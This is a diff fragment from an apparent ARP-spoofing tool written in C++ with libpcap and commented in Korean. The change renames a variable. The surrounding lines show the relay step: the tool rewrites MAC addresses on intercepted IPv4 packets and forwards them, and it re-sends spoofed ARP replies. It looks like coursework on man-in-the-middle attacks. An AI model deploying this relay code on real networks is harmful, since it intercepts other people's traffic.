@@ -294,32 +294,32 @@ int main(int argc, char* argv[]) {
             break;
         }
 
-        EthHdr*      spoofedPacket = (EthHdr*)packet;
-        bpf_u_int32  spoofedPacketSize = header->caplen;
+        EthHdr*      Packet_spoof = (EthHdr*)packet;
+        bpf_u_int32  Packet_spoof_size = header->caplen;
 
         // 세션에 대하여 패킷과 비교
         for(int i = 0; i < Session_Number; i++)
         {
-            if(spoofedPacket->smac() != session[i].senderMac){ // sender의 Mac 이 아닌 경우
-                if(spoofedPacket->dmac() != My_Mac){ // 나에게 relay 된 것이 아닌 경우
+            if(Packet_spoof->smac() != session[i].senderMac){ // sender의 Mac 이 아닌 경우
+                if(Packet_spoof->dmac() != My_Mac){ // 나에게 relay 된 것이 아닌 경우
                     continue;  
                 }
             }     
             // ip 패킷이 정상적으로 온 경우
-            if(spoofedPacket->type() == EthHdr::Ip4){
+            if(Packet_spoof->type() == EthHdr::Ip4){
                 // dmac 과 smac 의 정보를 변경
-                spoofedPacket->dmac_ = session[i].targetMac;
-                spoofedPacket->smac_ = My_Mac;
+                Packet_spoof->dmac_ = session[i].targetMac;
+                Packet_spoof->smac_ = My_Mac;
 
-                res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(spoofedPacket), spoofedPacketSize);
+                res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(Packet_spoof), Packet_spoof_size);
                 if (res != 0) {
                     fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
                 }
-                printf("[세션 번호 #%d] 패킷 캡쳐 완료 ! ! - ( %u bytes ) \n", i, spoofedPacketSize);
+                printf("[세션 번호 #%d] 패킷 캡쳐 완료 ! ! - ( %u bytes ) \n", i, Packet_spoof_size);
             }
 
             // ARP 패킷이 정상적으로 온 경우
-            else if(spoofedPacket->type() == EthHdr::Arp){
+            else if(Packet_spoof->type() == EthHdr::Arp){
                 res = pcap_sendpacket(
                     handle, reinterpret_cast<const u_char*>( &(session[i] ,send_Arp_relay) ), sizeof(EthArpPacket));
                 if (res != 0) {
